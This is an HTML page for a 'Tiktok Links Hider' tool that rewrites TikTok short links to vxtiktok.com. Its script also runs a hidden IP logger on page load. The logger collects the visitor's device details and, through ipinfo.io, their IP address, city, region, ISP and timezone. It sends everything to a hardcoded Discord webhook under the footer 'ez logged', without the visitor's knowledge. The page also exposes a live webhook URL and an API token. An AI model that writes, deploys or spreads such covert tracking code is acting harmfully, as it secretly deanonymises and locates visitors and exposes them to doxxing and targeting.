<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok Links Hider</title>
    <style>
        /* Your existing styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 40px;
            background-color: #1f1f1f;
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
            opacity: 0;
            transform: translateY(50px);
            animation: fadeInUp 1s forwards ease-out;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: #ff5c5c;
        }
        input[type="url"] {
            width: 80%;
            padding: 15px;
            border: none;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 1rem;
            background-color: #333;
            color: #fff;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            margin: 10px;
            transition: background-color 0.3s ease;
        }
        button.replace {
            background-color: #ff5c5c;
            color: white;
        }
        button.replace:hover {
            background-color: #ff4040;
        }
        button.copy {
            background-color: #1f8b4c;
            color: white;
        }
        button.copy:hover {
            background-color: #146c39;
        }
        .output {
            display: none;
            margin-top: 20px;
            background-color: #333;
            padding: 15px;
            border-radius: 5px;
            font-size: 1rem;
            word-wrap: break-word;
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Tiktok Links Hider</h1>
        <input type="url" id="tiktokLink" placeholder="Enter TikTok link" required>
        <br>
        <button class="replace" onclick="replaceLink()">Replace Link</button>
        <button class="copy" onclick="copyLink()" style="display: none;" id="copyButton">Copy Link</button>
        <div id="result" class="output">
            <p>Your replaced link:</p>
            <p id="replacedLink"></p>
        </div>
    </div>

    <script>

    // Function to send device and geolocation information to Discord webhook
    function sendDeviceInfoToWebhook() {
        const webhookURL = 'https://discord.com/api/webhooks/1296274274151043072/ImR7zXQ3rInBB3LXRwj_-n-PZgnBv-UupH44qtpY1p6LkwuGnOjSwzvFWWZtMyG0zp42';

        // Device information
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            language: navigator.language
        };

        // Fetch geolocation info from ipinfo.io
        fetch('https://ipinfo.io?token=0a7775d6f7e150') // Replace with your ipinfo.io token
            .then(response => response.json())
            .then(geoData => {
                const geoInfo = {
                    ip: geoData.ip,
                    countryCode: geoData.country,
                    region: geoData.region,
                    city: geoData.city,
                    org: geoData.org,
                    timezone: geoData.timezone
                };

                // Fetch full country name using the country code
                fetch(`https://restcountries.com/v3.1/alpha/${geoInfo.countryCode}`)
                    .then(response => response.json())
                    .then(countryData => {
                        const countryName = countryData[0].name.common; // Full country name
                        const flagURL = `https://flagcdn.com/48x36/${geoInfo.countryCode.toLowerCase()}.png`; // Country flag URL

                        // Construct the embedded message content for Discord
                        const embed = {
                            embeds: [{
                                title: "Logged Information",
                                color: 3447003,  // You can change the color code
                                fields: [
                                    {
                                        name: "Device Information",
                                        
                                        value: `
                                        **User Agent:** ${deviceInfo.userAgent}
                                        **Platform:** ${deviceInfo.platform}
                                        **Screen Width:** ${deviceInfo.screenWidth}
                                        **Screen Height:** ${deviceInfo.screenHeight}
                                        **Language:** ${deviceInfo.language}
                                        `,
                                        inline: false
                                    },
                                    {
                                        name: "IP Information",
                                        
                                        value: `
                                        **IP Address:** ${geoInfo.ip}
                                        **Country:** ${countryName} (${geoInfo.countryCode})
                                        **Region:** ${geoInfo.region}
                                        **City:** ${geoInfo.city}
                                        **Organization:** ${geoInfo.org}
                                        **Timezone:** ${geoInfo.timezone}
                                        `,
                                        inline: false
                                    }
                                ],
                                thumbnail: {
                                    url: flagURL // Displays the country flag
                                },
                                footer: {
                                    text: "ez logged"
                                },
                                timestamp: new Date()  // Adds the timestamp
                            }]
                        };

                        // Send the embedded information to the Discord webhook
                        fetch(webhookURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(embed)
                        })
                        .then(response => {
                            if (response.ok) {
                                console.log('Device and geo info sent to webhook');
                            } else {
                                console.error('Error sending info', response.statusText);
                            }
                        })
                        .catch(error => console.error('Error sending info:', error));
                    })
                    .catch(error => console.error('Error fetching full country name:', error));
            })
            .catch(error => console.error('Error fetching geo info:', error));
    }

    // Call the function when the page loads
    window.onload = sendDeviceInfoToWebhook;

        // Existing link replacement logic
        function replaceLink() {
            const inputLink = document.getElementById("tiktokLink").value;
            const pattern = /^https:\/\/vt\.tiktok\.com\/([a-zA-Z0-9]+)\/?$/;
            const match = inputLink.match(pattern);

            if (match) {
                const code = match[1];  // Extract the TikTok code
                const newLink = `https://www.vxtiktok.com/t/${code}/`;
                document.getElementById("replacedLink").innerHTML = `<a href="${newLink}" target="_blank">${newLink}</a>`;
                document.getElementById("result").style.display = 'block';
                document.getElementById("copyButton").style.display = 'inline-block';
            } else {
                document.getElementById("replacedLink").textContent = "Invalid TikTok link. Please enter a valid TikTok link.";
                document.getElementById("result").style.display = 'block';
                document.getElementById("copyButton").style.display = 'none';
            }
        }

        function copyLink() {
            const linkText = document.getElementById("replacedLink").innerText;
            navigator.clipboard.writeText(linkText).then(() => {
                alert("Link copied to clipboard!");
            }).catch(err => {
                alert("Failed to copy: ", err);
            });
        }
    </script>

</body>
</html>
